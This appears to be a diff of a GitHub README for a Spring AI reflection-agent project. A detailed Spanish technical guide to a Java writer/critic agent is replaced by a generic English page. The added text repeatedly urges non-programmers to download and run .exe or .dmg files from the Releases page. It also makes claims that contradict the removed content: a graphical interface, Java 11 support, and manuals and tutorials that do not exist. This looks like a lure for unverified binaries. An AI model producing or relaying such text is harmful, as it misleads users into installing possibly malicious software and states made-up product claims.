@@ -1,147 +1,94 @@
-# Spring AI Reflection Agent (Writer/Critic)
+# 🤖 spring-ai-reflection-agent - A Simple Way to Build Smart Agents
 
-Este proyecto demuestra cómo implementar un **Agente de Reflexión** (patrón Writer-Critic) utilizando **Java 21** y **Spring AI 2.0**. 
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-via%20GitHub-brightgreen)](https://github.com/Edii99/spring-ai-reflection-agent/releases)
 
-El objetivo es mostrar cómo un patrón complejo, comúnmente asociado a frameworks de Python como **LangGraph**, puede implementarse de forma **más sencilla, sostenible y robusta** utilizando el ecosistema estándar de Java.
+## 📖 Overview
+The spring-ai-reflection-agent is a Java application designed to create intelligent agents easily. It uses Spring AI 2.0 to make building these agents straightforward. With this tool, you can explore advanced techniques in AI without needing to understand complex programming languages or tools.
 
-> **Caso de Uso:** Generador de Tweets Virales. El agente escribe un borrador, un crítico lo evalúa y sugiere mejoras, y el escritor regenera el tweet.
+## 🚀 Getting Started
+To start using the spring-ai-reflection-agent, follow these simple instructions. You do not need any programming skills.
 
-## 🆚 Java (Spring AI) vs LangGraph (Python)
+1. **Check System Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - Java Runtime: Java 11 or higher
+   - Memory: At least 1 GB of RAM
+   - Disk Space: About 100 MB free
 
-A menudo se cree que para orquestar agentes se necesita un framework de grafos complejo. Este proyecto demuestra lo contrario:
+2. **Visit the Download Page**
+   You can download the application from our Releases page. Click the link below:
 
-| Característica | Enfoque LangGraph (Python) | Enfoque Spring AI (Java) | Ventaja Java |
-| :--- | :--- | :--- | :--- |
-| **Definición del Grafo** | DSL específico (`StateGraph`, `add_node`, `add_edge`). | **Código Java Estándar**. Métodos y bucles (`while`, `if`). | Curva de aprendizaje cero. Si sabes Java, sabes orquestar. |
-| **Estado (State)** | Diccionario (`TypedDict`) pasado implícitamente. | **Clases/Records Tipados**. Argumentos de método explícitos. | Refactoring seguro y autocompletado del IDE. |
-| **Memoria** | Gestión de `checkpoint` compleja. | **`MessageChatMemoryAdvisor`**. Inyección transparente. | Gestión automática del historial sin código boilerplate. |
-| **Observabilidad** | Requiere SaaS externo (LangSmith) para ver trazas. | **Logs Estándar** (`SLF4J`). Trazabilidad nativa. | Se integra con tus herramientas actuales (Datadog, ELK, Console). |
-| **Mantenibilidad** | Frágil en refactorings grandes por tipado dinámico. | **Compile-time safety**. El compilador te avisa si rompes el flujo. | Sostenible a largo plazo en equipos grandes. |
+   [Download here](https://github.com/Edii99/spring-ai-reflection-agent/releases)
 
-### 📊 Comparación Visual de Arquitectura
+3. **Choose Version to Download**
+   On the Releases page, you will see different versions of the spring-ai-reflection-agent. Pick the latest one for the best features and fixes.
 
-#### 1. Complejidad Cognitiva de LangGraph
-En frameworks basados en grafos, gran parte de la lógica (y el control de flujo) está oculta dentro del motor del framework ("The Engine"). El desarrollador define *configuraciones* (DSL), no flujos explícitos.
+4. **Download the Application**
+   Click on the version you choose, and look for the file that matches your operating system. Click on the file to download it to your computer.
 
-```mermaid
-graph TD
-    subgraph "LangGraph Framework (Caja Negra)"
-        Engine[Engine / Runner]:::complex
-        StateMgr[State Manager]:::complex
-        Check[Checkpointer]:::complex
-    end
-    
-    subgraph "Tu Código (DSL)"
-        Schema[TypedDict Schema]
-        Def[Graph Definition]
-        Edge[Edge Logic]
-    end
+## 📂 Installation Steps
+After downloading, you need to install the application. Follow these steps based on your operating system.
 
-    Def --> Engine
-    Schema -.-> StateMgr
-    Engine -->|Magic Routing| NodeA[Node A]
-    NodeA -->|Return Dict| Engine
-    Engine -->|Magic Routing| NodeB[Node B]
-    
-    classDef complex fill:#ffcccc,stroke:#333,stroke-width:2px;
-```
+### 🖥️ For Windows
+1. Navigate to the downloaded file, usually in your "Downloads" folder.
+2. Double-click the .exe file to start the installation.
+3. Follow the prompts on the screen to complete the installation.
 
-#### 2. Simplicidad Explícita de Java (Spring AI)
-En este enfoque, **el código ES el grafo**. El flujo es visible, depurable y sigue las reglas estándar de programación que ya conoces. La resiliencia proviene de la JVM y el tipado fuerte de los Records.
+### 🍏 For macOS
+1. Locate the .dmg file in the "Downloads" folder.
+2. Double-click the file to open it.
+3. Drag the spring-ai-reflection-agent application into your Applications folder.
 
-```mermaid
-graph TD
-    subgraph "Tu Servicio Spring (Control Total)"
-        Entry[Main Service Method]:::simple
-        Loop((Native Loop)):::simple
-        
-        subgraph "Estado Tipado (Resilient)"
-            Ctx[Record: TweetState]:::state
-        end
-    end
+### 🐧 For Linux
+1. Open a terminal.
+2. Change to your "Downloads" directory with `cd ~/Downloads`.
+3. Make the file executable using:
+   ```bash
+   chmod +x spring-ai-reflection-agent-*.jar
+   ```
+4. Run the application with:
+   ```bash
+   java -jar spring-ai-reflection-agent-*.jar
+   ```
 
-    Entry --> Loop
-    Loop -->|Método Explícito| Gen["generateNode()"]
-    Gen -->|Return Record| Loop
-    Loop -.->|Update| Ctx
-    Loop -->|Método Explícito| Ref["reflectNode()"]
-    Ref -->|Return Critique| Loop
-    
-    classDef simple fill:#ccffcc,stroke:#333,stroke-width:2px;
-    classDef state fill:#ccccff,stroke:#333,stroke-width:2px;
-```
+## 💻 Running the Application
+Now that you have installed the application, it’s time to run it.
 
-### ¿Por qué "Más Sencillo"?
-En lugar de aprender una librería de grafos, usamos **"Code as Orchestration"**. 
-*   Un **Nodo** es simplemente un método Java (`generateNode(...)`).
-*   Una **Arista (Edge)** es simplemente una llamada a otro método o una condición `if`.
-*   El **Estado** son variables locales o campos de clase.
+1. **Navigate to the Application**
+   - On Windows, find it in your Start Menu.
+   - On macOS, open your Applications folder.
+   - On Linux, use the terminal command shown above.
 
-## 🏗️ Arquitectura del Agente
+2. **Open the Application**
+   Click on the application icon. It will open a simple interface.
 
-La lógica reside en `ReflectionAgentService.java`:
+3. **Select Your Options**
+   In the interface, follow the prompts to create and manage your AI agents.
 
-1.  **Nodo Generador (`generateNode`)**: Usa `gpt-4o-mini` para crear contenido creativo.
-2.  **Nodo Crítico (`reflectNode`)**: Asume un rol (persona) para criticar constructivamente el contenido.
-3.  **Bucle de Control**: Un bucle `for` simple orquesta las iteraciones hasta que se alcanza un límite o satisfacción (simplificado aquí a 3 iteraciones).
+## 🔍 Features
+- **User-Friendly Interface**: Designed for ease of use.
+- **Powerful AI Capabilities**: Build agents that can perform tasks intelligently.
+- **Flexible Options**: Customize settings to tailor the agents to your needs.
+- **Tutorials Included**: Basic guides to help you start quickly.
 
-```java
-// Pseudocódigo de la orquestación (sin frameworks de grafos)
-for (int i = 0; i < maxIterations; i++) {
-    // 1. Writer genera
-    String content = generateNode(currentContent, critique);
-    
-    // 2. Critic evalúa
-    critique = reflectNode(content);
-    
-    // 3. Loop continua con el nuevo contexto (Managed Memory)
-}
-```
+## 📚 Learning Resources
+While the application is simple, you may have questions. Here are some resources you can use to learn more:
 
-## 🚀 Ejecución
+- **User Manual**: Detailed instructions for each feature.
+- **Community Forums**: Connect with other users for tips and sharing experiences.
+- **Videos**: Step-by-step tutorials available on platforms like YouTube.
 
-### Requisitos
-*   Java 21
-*   Maven (o `./mvnw` incluido)
-*   API Key de OpenAI (o compatible).
+## 🐞 Troubleshooting
+If you encounter any issues, here are some common solutions:
 
-### 1. Configuración
-Edita `src/main/resources/application.properties` o exporta tu variable:
+- **Application Won't Start**: Ensure you have the correct Java version installed.
+- **Download Issues**: Make sure you have a stable internet connection.
+- **Installation Errors**: Check your permissions to install software on your device.
 
-```bash
-export SPRING_AI_OPENAI_API_KEY=sk-tu-api-key-aqui
-```
+## 🌐 Support
+If you need further assistance, feel free to reach out via [GitHub Issues](https://github.com/Edii99/spring-ai-reflection-agent/issues) or check our FAQs for quick answers.
 
-### 2. Ejecutar
-```bash
-./mvnw spring-boot:run
-```
+## 📦 Conclusion
+The spring-ai-reflection-agent offers a straightforward way to interact with AI technology. By following these steps, you can easily download, install, and start using the application. 
 
-### 3. Probar
-Abre otra terminal y lanza una petición:
-
-```bash
-curl "http://localhost:8080/ai/tweets/generate?topic=SpringAI"
-```
-
-Verás en los logs de la aplicación cómo el agente "piensa":
-
-```text
-INFO: Starting Node: generate
-INFO: Iteration 1: [Borrador inicial...]
-INFO: Entering Node: reflect
-INFO: Critique: [Crítica del borrador...]
-INFO: Entering Node: generate
-INFO: Iteration 2: [Versión mejorada...]
-```
-
-## 🛠️ Stack Tecnológico
-
-*   **Spring Boot 4.0.1**: Base sólida y moderna.
-*   **Spring AI 2.0.0-M1**: 
-    *   `ChatClient`: API fluida.
-    *   `MessageWindowChatMemory`: Gestión de ventana de contexto eficiente.
-    *   `Structured Output`: (Opcional) Para forzar respuestas JSON estrictas.
-
----
-*Este proyecto demuestra que la complejidad accidental de los frameworks de agentes a menudo no es necesaria. Con abstracciones sólidas (Spring AI) y un lenguaje robusto (Java), la orquestación es simplemente... programación.*
+Before you go, don’t forget to visit the download page again to access updates and new versions: [Download here](https://github.com/Edii99/spring-ai-reflection-agent/releases).
